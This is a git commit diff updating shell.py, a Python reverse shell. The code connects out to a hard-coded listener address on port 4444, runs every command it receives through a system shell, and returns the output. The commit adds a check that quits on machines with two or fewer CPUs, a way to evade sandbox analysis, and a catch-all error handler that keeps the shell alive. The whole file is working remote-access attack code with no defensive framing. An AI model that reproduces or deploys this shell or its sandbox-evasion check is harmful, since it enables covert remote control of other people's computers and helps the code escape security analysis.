8a7e351a9a3e06f240d23bc0f76cdf816cba045f
Matt Houston <TacticalCheerio@users.noreply.github.com>
2019-10-15 16:10:17 -0400

    Update shell.py
    Added a catch all errors and continue block, a check for sandbox by cpu count, and adjusted the I/O to be a bit cleaner

--- shell.py
+++ shell.py
@@ -1,30 +1,33 @@
-#!/usr/bin/python
-
 import os
 import socket
 import subprocess
 
-HOST = '192.168.1.100' # The ip of the listener.
-PORT = 4444 # The same port as listener.
+
+if os.cpu_count() <= 2:
+    quit()
+
+HOST = '192.168.1.14'
+PORT = 4444
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((HOST, PORT)) # Connect to listener.
-s.send(str.encode("[*] Connection Established!")) # Send connection confirmation.
+s.connect((HOST, PORT))
+s.send(str.encode("[*] Connection Established!"))
 
-while 1: # Start loop.
-    data = s.recv(1024).decode("UTF-8") # Recieve shell command.
-    if data == "quit": 
-        break # If it's quit, then break out and close socket.
-    if data[:2] == "cd":
-        os.chdir(data[3:]) # If it's cd, change directory.
-    # Run shell command.
-    if len(data) > 0:
-        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
-        stdout_value = proc.stdout.read() + proc.stderr.read() # Read output.
-        output_str = str(stdout_value, "UTF-8") # Format output.
-        currentWD = os.getcwd() + "> " # Get current working directory.
-        s.send(str.encode(currentWD + output_str)) # Send output to listener.
+while 1:
+    try:
+        s.send(str.encode(os.getcwd() + "> "))
+        data = s.recv(1024).decode("UTF-8")
+        data = data.strip('\n')
+        if data == "quit": 
+            break
+        if data[:2] == "cd":
+            os.chdir(data[3:])
+        if len(data) > 0:
+            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
+            stdout_value = proc.stdout.read() + proc.stderr.read()
+            output_str = str(stdout_value, "UTF-8")
+            s.send(str.encode("\n" + output_str))
+    except Exception as e:
+        continue
     
-s.close() # Close socket.
-
-
+s.close()
